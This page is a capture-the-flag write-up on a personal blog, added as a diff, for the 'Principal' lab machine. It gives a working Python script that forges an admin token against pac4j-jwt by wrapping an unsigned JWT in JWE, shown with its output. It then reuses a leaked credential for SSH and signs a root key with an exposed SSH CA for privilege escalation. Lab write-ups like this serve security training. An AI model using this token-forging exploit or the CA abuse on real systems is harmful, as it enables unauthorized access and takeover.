@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Principal - CTF | 1xTP</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Principal - CTF | 1xTrashPanda</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Principal - CTF" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Bypassing pac4j-jwt authentication with a forged JWE token and exploiting SSH Certificate Authorities for root access" />
+<meta property="og:description" content="Bypassing pac4j-jwt authentication with a forged JWE token and exploiting SSH Certificate Authorities for root access" />
+<link rel="canonical" href="http://0.0.0.0:4000/writeups/Principle/" />
+<meta property="og:url" content="http://0.0.0.0:4000/writeups/Principle/" />
+<meta property="og:site_name" content="1xTrashPanda" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2026-03-14T00:00:00-07:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Principal - CTF" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2026-03-14T00:00:00-07:00","datePublished":"2026-03-14T00:00:00-07:00","description":"Bypassing pac4j-jwt authentication with a forged JWE token and exploiting SSH Certificate Authorities for root access","headline":"Principal - CTF","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/writeups/Principle/"},"url":"http://0.0.0.0:4000/writeups/Principle/"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-left">
+            <a href="/index.html"><h2>1xTP</h2></a>
+        </div>
+        <div class="nav-right">
+            <a href="/about.html">About</a>
+            <a href="/categories.html">Categories</a>
+        </div>
+    </nav>
+
+    <div class="container">
+        <aside class="profile-card" id="profileCard">
+            <div class="sidebar-toggle" id="sidebarToggle">
+                <i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="profile-img">
+                <img src="/assets/raccoon-pfp.png" alt="1xTrashPanda" class="profile-pic">
+            </div>
+            
+            <div class="profile-info-container">
+                <div class="profile-nb-container">
+                    <div class="profile-username">
+                        <h3>1xTrashPanda</h3>
+                    </div>
+                    <p class="profile-bio">
+                        Focus: <span class="accent">Offensive Security</span><br>
+                        Specialty: <span class="accent">WebApps & AD</span>
+                    </p>
+                </div>
+
+                <div class="profile-links">
+                    <a href="https://github.com/1xTP" target="_blank">
+                        <i class="fab fa-github"></i> Github
+                    </a>
+                </div>
+            </div>
+        </aside>
+
+        <main class="web-content-container">
+            <article class="report-body">
+
+    <section class="report-section">
+        <h2>1. Overview</h2>
+        <p>This challenge involved exploiting a vulnerability in the authentication system of a web application in order to gain administrative access. After bypassing the login system, sensitive credentials were discovered within the application dashboard which allowed SSH access to the machine. From there, privilege escalation was achieved by abusing an exposed SSH certificate authority key to generate a signed key for the root user.</p>
+    </section>
+
+    <section class="report-section">
+        <h2>2. Enum</h2>
+        <p>My first step was to run a standard service and version scan using Nmap to see what services were exposed.</p>
+
+        <figure class="highlight"><pre><code class="language-bash" data-lang="bash">└─<span class="nv">$ </span>nmap <span class="nt">-sCV</span> 10.129.244.220 <span class="nt">--min-rate</span> 5000 
+Starting Nmap 7.98 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-03-14 19:00 <span class="nt">-0400</span>
+Nmap scan report <span class="k">for </span>10.129.244.220
+Host is up <span class="o">(</span>0.086s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 998 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   256 b0:a0:ca:46:bc:c2:cd:7e:10:05:05:2a:b8:c9:48:91 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 e8:a4:9d:bf:c1:b6:2a:37:93:40:d0:78:00:f5:5f:d9 <span class="o">(</span>ED25519<span class="o">)</span>
+8080/tcp open  http-proxy Jetty
+|_http-server-header: Jetty
+|_http-open-proxy: Proxy might be redirecting requests
+| http-title: Principal Internal Platform - Login
+|_Requested resource was /login
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 Not Found
+|     Date: Sat, 14 Mar 2026 23:00:44 GMT
+|     Server: Jetty
+|     X-Powered-By: pac4j-jwt/6.0.3
+...[SNIP]...</code></pre></figure>
+
+        <p>The scan found two open ports:</p>
+        <ul>
+            <li><b>22</b> running SSH</li>
+            <li><b>8080</b> running a web server powered by <b>Jetty</b></li>
+        </ul>
+
+        <p>The http responses also included the header:</p>
+        
+        <figure class="highlight"><pre><code class="language-text" data-lang="text">X-Powered-By: pac4j-jwt/6.0.3</code></pre></figure>
+
+        <p>This indicated the server was using the <code>pac4j-jwt</code> library.</p>
+    </section>
+
+    <section class="report-section">
+        <h2>2.1 Web Enum</h2>
+        <p>Since there was a web service, my next step was to inspect the website itself. To learn more about the client-side Javascript, I looked at the main <code>app.js</code> code used by the site:</p>
+
+        <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="err">└─</span><span class="nx">$</span> <span class="nx">curl</span> <span class="o">-</span><span class="nx">s</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//10.129.4.116:8080/static/js/app.js</span>
+<span class="cm">/**
+ * Principal Internal Platform - Client Application
+ * Version: 1.2.0
+ *
+ * Authentication flow:
+ * 1. User submits credentials to /api/auth/login
+ * 2. Server returns encrypted JWT (JWE) token
+ * 3. Token is stored and sent as Bearer token for subsequent requests
+ *
+ * Token handling:
+ * - Tokens are JWE-encrypted using RSA-OAEP-256 + A128GCM
+ * - Public key available at /api/auth/jwks for token verification
+ * - Inner JWT is signed with RS256
+ *
+ * JWT claims schema:
+ * sub   - username
+ * role  - one of: ROLE_ADMIN, ROLE_MANAGER, ROLE_USER
+ * iss   - "principal-platform"
+ * iat   - issued at (epoch)
+ * exp   - expiration (epoch)
+ */</span>
+
+<span class="kd">const</span> <span class="nx">API_BASE</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
+<span class="kd">const</span> <span class="nx">JWKS_ENDPOINT</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">/api/auth/jwks</span><span class="dl">'</span><span class="p">;</span>
+<span class="kd">const</span> <span class="nx">AUTH_ENDPOINT</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">/api/auth/login</span><span class="dl">'</span><span class="p">;</span>
+<span class="kd">const</span> <span class="nx">DASHBOARD_ENDPOINT</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">/api/dashboard</span><span class="dl">'</span><span class="p">;</span>
+<span class="kd">const</span> <span class="nx">USERS_ENDPOINT</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">/api/users</span><span class="dl">'</span><span class="p">;</span>
+<span class="kd">const</span> <span class="nx">SETTINGS_ENDPOINT</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">/api/settings</span><span class="dl">'</span><span class="p">;</span>
+<span class="p">...[</span><span class="nx">SNIP</span><span class="p">]...</span></code></pre></figure>
+
+        <p>From this information it became clear that authentication relied on <b>JWT tokens</b> wrapped inside <b>JWE encryption</b>. The server's public key could also be retrieved from the following endpoint:</p>
+
+        <figure class="highlight"><pre><code class="language-text" data-lang="text">/api/auth/jwks
+        </code></pre></figure>
+
+        <p>Curling that endpoint returned the RSA key used by the application.</p>
+
+        <figure class="highlight"><pre><code class="language-json" data-lang="json"><span class="err">└─$</span><span class="w"> </span><span class="err">curl</span><span class="w"> </span><span class="err">http://</span><span class="mf">10.129</span><span class="err">.</span><span class="mf">4.116</span><span class="err">:</span><span class="mi">8080</span><span class="err">/api/auth/jwks</span><span class="w"> </span><span class="err">|</span><span class="w"> </span><span class="err">jq</span><span class="w"> </span><span class="err">.</span><span class="w">
+</span><span class="p">{</span><span class="w">
+  </span><span class="nl">"keys"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+    </span><span class="p">{</span><span class="w">
+      </span><span class="nl">"kty"</span><span class="p">:</span><span class="w"> </span><span class="s2">"RSA"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"e"</span><span class="p">:</span><span class="w"> </span><span class="s2">"AQAB"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"kid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"enc-key-1"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"n"</span><span class="p">:</span><span class="w"> </span><span class="s2">"lTh54vtBS1NAWrxAFU1NEZdrVxPeSMhHZ5NpZX-WtBsdWtJRaeeG61iNgYsFUXE9j2MAqmekpnyapD6A9dfSANhSgCF60uAZhnpIkFQVKEZday6ZIxoHpuP9zh2c3a7JrknrTbCPKzX39T6IK8pydccUvRl9zT4E_i6gtoVCUKixFVHnCvBpWJtmn4h3PCPCIOXtbZHAP3Nw7ncbXXNsrO3zmWXl-GQPuXu5-Uoi6mBQbmm0Z0SC07MCEZdFwoqQFC1E6OMN2G-KRwmuf661-uP9kPSXW8l4FutRpk6-LZW5C7gwihAiWyhZLQpjReRuhnUvLbG7I_m2PV0bWWy-Fw"</span><span class="w">                                                                                                         
+    </span><span class="p">}</span><span class="w">
+  </span><span class="p">]</span><span class="w">
+</span><span class="p">}</span></code></pre></figure>
+    </section>
+
+    <section class="report-section">
+        <h2>3. Foothold</h2>
+        <p>After identifying the technology stack, I searched for known vulnerabilities affecting the version of <b>pac4j-jwt</b> used by the application. This led to <b>CVE-2026-29000</b>, which allows an attacker to forge authentication tokens.</p>
+
+        <p>Using this vulnerability, it is possible to:</p>
+        <ol>
+            <li>Retrieve the server's public key from the JWKS endpoint</li>
+            <li>Create a custom JWT with administrator privileges</li>
+            <li>Encrypt the token as a JWE using the public key</li>
+            <li>Use the forged token to authenticate as an admin user</li>
+        </ol>
+
+        <p>To automate this process, I wrote the following Python script.</p>
+
+        <figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="n">json</span>
+<span class="kn">import</span> <span class="n">time</span>
+<span class="kn">import</span> <span class="n">base64</span>
+<span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">from</span> <span class="n">jwcrypto</span> <span class="kn">import</span> <span class="n">jwk</span><span class="p">,</span> <span class="n">jwe</span>
+<span class="kn">import</span> <span class="n">sys</span>
+
+<span class="n">TARGET</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Fetching JWKS...</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">TARGET</span><span class="si">}</span><span class="s">/api/auth/jwks</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">jwks_data</span> <span class="o">=</span> <span class="n">resp</span><span class="p">.</span><span class="nf">json</span><span class="p">()</span>
+<span class="n">key_data</span> <span class="o">=</span> <span class="n">jwks_data</span><span class="p">[</span><span class="sh">'</span><span class="s">keys</span><span class="sh">'</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">pub_key</span> <span class="o">=</span> <span class="n">jwk</span><span class="p">.</span><span class="nc">JWK</span><span class="p">(</span><span class="o">**</span><span class="n">key_data</span><span class="p">)</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] Got RSA public key (kid: </span><span class="si">{</span><span class="n">key_data</span><span class="p">[</span><span class="sh">'</span><span class="s">kid</span><span class="sh">'</span><span class="p">]</span><span class="si">}</span><span class="s">)</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">b64url_encode</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">base64</span><span class="p">.</span><span class="nf">urlsafe_b64encode</span><span class="p">(</span><span class="n">data</span><span class="p">).</span><span class="nf">rstrip</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">=</span><span class="sh">'</span><span class="p">).</span><span class="nf">decode</span><span class="p">()</span>
+
+<span class="n">now</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">())</span>
+<span class="n">header</span> <span class="o">=</span> <span class="nf">b64url_encode</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">({</span><span class="sh">"</span><span class="s">alg</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">none</span><span class="sh">"</span><span class="p">}).</span><span class="nf">encode</span><span class="p">())</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="nf">b64url_encode</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">({</span>
+    <span class="sh">"</span><span class="s">sub</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">admin</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">role</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">ROLE_ADMIN</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">iss</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">principal-platform</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">iat</span><span class="sh">"</span><span class="p">:</span> <span class="n">now</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">exp</span><span class="sh">"</span><span class="p">:</span> <span class="n">now</span> <span class="o">+</span> <span class="mi">3600</span>
+<span class="p">}).</span><span class="nf">encode</span><span class="p">())</span>
+
+<span class="n">plain_jwt</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">header</span><span class="si">}</span><span class="s">.</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s">.</span><span class="sh">"</span>
+<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[*] Crafted PlainJWT with sub=admin, role=ROLE_ADMIN</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="n">jwe_token</span> <span class="o">=</span> <span class="n">jwe</span><span class="p">.</span><span class="nc">JWE</span><span class="p">(</span>
+    <span class="n">plain_jwt</span><span class="p">.</span><span class="nf">encode</span><span class="p">(),</span>
+    <span class="n">recipient</span><span class="o">=</span><span class="n">pub_key</span><span class="p">,</span>
+    <span class="n">protected</span><span class="o">=</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">({</span>
+        <span class="sh">"</span><span class="s">alg</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">RSA-OAEP-256</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">enc</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">A128GCM</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">kid</span><span class="sh">"</span><span class="p">:</span> <span class="n">key_data</span><span class="p">[</span><span class="sh">'</span><span class="s">kid</span><span class="sh">'</span><span class="p">],</span>
+        <span class="sh">"</span><span class="s">cty</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">JWT</span><span class="sh">"</span>
+    <span class="p">})</span>
+<span class="p">)</span>
+
+<span class="n">forged_token</span> <span class="o">=</span> <span class="n">jwe_token</span><span class="p">.</span><span class="nf">serialize</span><span class="p">(</span><span class="n">compact</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] Forged JWE token created</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">Authorization</span><span class="sh">"</span><span class="p">:</span> <span class="sa">f</span><span class="sh">"</span><span class="s">Bearer </span><span class="si">{</span><span class="n">forged_token</span><span class="si">}</span><span class="sh">"</span><span class="p">}</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">[*] Accessing /api/dashboard...</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">TARGET</span><span class="si">}</span><span class="s">/api/dashboard</span><span class="sh">"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] Status: </span><span class="si">{</span><span class="n">resp</span><span class="p">.</span><span class="n">status_code</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">resp</span><span class="p">.</span><span class="nf">json</span><span class="p">()</span>
+<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] Authenticated as: </span><span class="si">{</span><span class="n">data</span><span class="p">[</span><span class="sh">'</span><span class="s">user</span><span class="sh">'</span><span class="p">][</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span><span class="si">}</span><span class="s"> (</span><span class="si">{</span><span class="n">data</span><span class="p">[</span><span class="sh">'</span><span class="s">user</span><span class="sh">'</span><span class="p">][</span><span class="sh">'</span><span class="s">role</span><span class="sh">'</span><span class="p">]</span><span class="si">}</span><span class="s">)</span><span class="sh">"</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] Token: </span><span class="si">{</span><span class="n">forged_token</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span></code></pre></figure>
+
+        <p>Running the script generated a valid authentication token with admin privileges.</p>
+
+        <figure class="highlight"><pre><code class="language-text" data-lang="text">└─$ python3 jwt.py http://10.129.4.116:8080
+Token: eyJhbGciOiAiUlNBLU9BRVAtMjU2IiwgImVuYyI6ICJBMTI4R0NNIiwgImtpZCI6ICJlbmMta2V5LTEiLCAiY3R5IjogIkpXVCJ9.SFxhAqrS8Tc5BcjuzHff_bORTozFOIxP5Uewg5_po5iltes_1JY9-7s914JrKXzCnCedbXWprbIiVLG8oxlIccdDh3A6D0xUdtPkD4im9K7JZhIcPukR-qtsFFMdESxWJkfpltf8GKkHI4k1DglNtTLFXs3QbxipNSrmsQTguK0xADPi3ugmD_o0UJdumW_FjPsnHJancL0bDX18NZLNkD6cevllO_GycCHXwoaggRmb63F4ZLm5SW8AzW-kZEbDvnN0ITK4C-HImaiAW1IuHG4KULJOz21DkzPpv1Ra9o3eNVHpi8eBUWgVBBnGdaHf0paycaOU6IDWg65Jvbuw4g.E-N4eNemkf7tsv13.jEykHeaLrHxz7hpp21bWQxtGW0ZcgPu40XlN0B8XHy06CxZMG6YFP1AHDeruTP9DPIQVIXAJ3WFwEOmekKHu9F0zB6UBbgRUeuW7GinyZwfarbNHTzNQWrEh3mablLCnU456BanRdpcXjFLfVlLv6RruWR-Ita_5aigOqJBhOBR-ujmPbi1Ka8LR-cNcIW_ivCjn6wVBPfV2UaO0ZBzuL9DP.0m49W7Bv7nBK5TocCG64OA</code></pre></figure>
+
+        <p>To use the token in the web interface, it needed to be placed into the browser's <b>session storage</b> under the key: <code>auth_token</code>.</p>
+
+        <p>After setting the value manually in the browser, the login page was bypassed and the administrative dashboard became accessible. While exploring the dashboard, I discovered a plaintext encryption key stored in the <b>settings panel</b>:</p>
+
+        <figure class="highlight"><pre><code class="language-text" data-lang="text">D3pl0y_$$H_Now42!</code></pre></figure>
+
+        <p>The users tab also listed an account named:</p>
+
+        <figure class="highlight"><pre><code class="language-text" data-lang="text">svc-deploy</code></pre></figure>
+
+        <p>Since service accounts often share related credentials, I tried to use this key as the password for the <code>svc-deploy</code> user over SSH and the login succeeded.</p>
+    </section>
+
+    <section class="report-section">
+        <h2>4. Root</h2>
+        <p>After gaining access as <code>svc-deploy</code>, I started checking common privilege escalation paths. Running <code>sudo -l</code> showed that the user did not have any sudo permissions, so I moved on to looking through the filesystem for interesting files.</p>
+
+        <p>One common location for application files is <code>/opt</code>, so I checked there first.</p>
+
+        <figure class="highlight"><pre><code class="language-bash" data-lang="bash">svc-deploy@principal:~<span class="nv">$ </span><span class="nb">ls</span> /opt/principal/
+app  deploy  ssh</code></pre></figure>
+
+        <p>The <code>ssh</code> folder was interesting, so I looked into it:</p>
+
+        <figure class="highlight"><pre><code class="language-bash" data-lang="bash">svc-deploy@principal:~<span class="nv">$ </span><span class="nb">ls</span> /opt/principal/ssh/
+README.txt  ca  ca.pub</code></pre></figure>
+
+        <p>The presence of a <b>CA key</b> suggested that the system was using <b>SSH certificate authentication</b>. If the private CA key could be used to sign a key for the root user, it might be possible to authenticate as root.</p>
+
+        <p>First, I generated a new SSH key pair.</p>
+
+        <figure class="highlight"><pre><code class="language-bash" data-lang="bash">svc-deploy@principal:~<span class="nv">$ </span>ssh-keygen <span class="nt">-t</span> ed25519 <span class="nt">-f</span> /tmp/id_rsa</code></pre></figure>
+
+        <p>Next, I used the CA key to sign the public key and assign it to the <b>root</b> user.</p>
+
+        <figure class="highlight"><pre><code class="language-bash" data-lang="bash">svc-deploy@principal:~<span class="nv">$ </span>ssh-keygen <span class="nt">-s</span> /opt/principal/ssh/ca <span class="nt">-I</span> HeHe <span class="nt">-n</span> root <span class="nt">-V</span> +1h /tmp/id_rsa.pub
+Signed user key /tmp/id_rsa-cert.pub: <span class="nb">id</span> <span class="s2">"HeHe"</span> serial 0 <span class="k">for </span>root valid from 2026-03-15T01:11:00 to 2026-03-15T02:12:31</code></pre></figure>
+
+        <p>With the signed key created, I tried to connect to the local SSH server as root and it worked.</p>
+
+        <figure class="highlight"><pre><code class="language-bash" data-lang="bash">svc-deploy@principal:~<span class="nv">$ </span>ssh <span class="nt">-i</span> /tmp/id_rsa root@127.0.0.1
+...[SNIP]...
+root@principal:~# </code></pre></figure>
+    </section>
+
+    <section class="report-section">
+        <h2>5. Conclusion</h2>
+        <p>Initial access was achieved by abusing a vulnerability in the pac4j-jwt authentication implementation to create a forged admin token. This allowed direct access to the application's admin dashboard.</p>
+        
+        <p>Sensitive information exposed in the dashboard included a plaintext key that matched the <code>svc-deploy</code> service account, which provided SSH access to the system. Once on the host, application files revealed an SSH certificate authority key. Signing a newly generated key for the root account allowed authentication as root and resulted in full system access.</p>
+    </section>
+
+    <footer class="report-footer">
+        --- [END OF PAGE] ---
+    </footer>
+
+</article>
+        </main>
+    </div>
+    <script>
+        const toggleBtn = document.getElementById('sidebarToggle');
+        const sidebar = document.querySelector('.profile-card');
+        const overlay = document.getElementById('mobileOverlay');
+
+        function toggleSidebar() {
+            sidebar.classList.toggle('active');
+            overlay.classList.toggle('active');
+        }
+
+        toggleBtn.addEventListener('click', toggleSidebar);
+
+        overlay.addEventListener('click', toggleSidebar);
+    </script>
+</body>
+</html>
